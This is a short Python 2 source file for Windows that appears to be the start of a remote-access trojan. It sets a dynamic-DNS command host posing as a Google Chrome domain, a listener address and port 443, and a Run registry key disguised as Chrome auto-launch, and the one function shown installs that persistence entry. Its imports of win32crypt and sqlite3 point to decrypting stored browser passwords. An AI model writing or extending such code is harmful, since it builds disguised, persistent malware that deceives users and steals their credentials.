import subprocess
import tempfile
import _winreg
import platform
import time
import os
import socket
import urllib
import sqlite3
import win32crypt
import sys

NO_IP_HOST = 'googlechromeauto.serveirc.com'
LHOST = '192.168.1.3'
LPORT = 443
TIME_SLEEP = 10

TEMP_PATH = tempfile.gettempdir()
REG_PATH = r'Software\Microsoft\Windows\CurrentVersion\Run'
REG_NAME = 'GoogleChromeAutoLaunch_9921366102WEAD21312ESAD31312'
REG_VALUE = '"' + TEMP_PATH + '\GoogleChromeAutoLaunch.exe' + '"' + '--no-startup-window /prefetch:5'

def set_reg_key_value(REG_PATH, name, value):
    try:
        registry_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, REG_PATH, 0, _winreg.KEY_ALL_ACCESS)
        _winreg.SetValueEx(registry_key, name, 0, _winreg.REG_SZ, value)
    except WindowsError:
        pass
    finally:
        print('Acction completed')
        _winreg.CloseKey(registry_key)